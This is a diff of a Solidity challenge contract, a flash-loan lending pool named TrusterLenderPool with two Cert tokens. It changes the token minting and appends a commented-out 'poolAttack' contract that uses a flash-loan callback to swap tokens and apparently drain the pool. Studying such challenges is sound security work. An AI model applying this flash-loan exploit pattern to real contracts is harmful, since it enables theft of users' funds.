@@ -37,7 +37,7 @@ contract Cert {
     }
 
     constructor () {
-        _mint(msg.sender, 100*10**18);
+        _mint(msg.sender, 10100*10**18);
 
     }
 
@@ -127,14 +127,14 @@ contract TrusterLenderPool is ReentrancyGuard {
 
     using Address for address;
 
-    IERC20 public immutable token0;
-    IERC20 public immutable token1;
+    Cert public immutable token0;
+    Cert public immutable token1;
 
     constructor (address token0Address,address token1Address) {
         token0 = new Cert();
-        token0.mint(address(this), 10000);
+        // token0._mint(address(this), 10000);
         token1 = new Cert();
-        token1.mint(address(this), 10000);
+        // token1._mint(address(this), 10000);
     }
 
     function swap(address tokenAddress,uint amount) public returns(uint){
@@ -180,3 +180,25 @@ contract TrusterLenderPool is ReentrancyGuard {
         require(token0.balanceOf(address(this)) == 0);
     }
 }
+// contract poolAttack{
+//     TrusterLenderPool public pool;
+//     Cert public token0;
+//     Cert public token1;
+//     constructor(address _pool){
+//         pool = TrusterLenderPool(_pool);
+//         token0=pool.token0();
+//         token1 = pool.token1();
+//     }
+//     function loan(uint256 amount)public{
+//         pool.flashLoan(amount,address(this));
+//     }
+//     function receiveEther(uint256 amount)public{
+//         token0.approve(address(pool),amount);
+//         pool.swap(address(token1),amount);
+//     }
+//     function ended(uint256 amount)public{
+//         token1.approve(address(pool),amount);
+//         pool.swap(address(token0),amount);
+//     }
+//     fallback()external payable{}
+// }
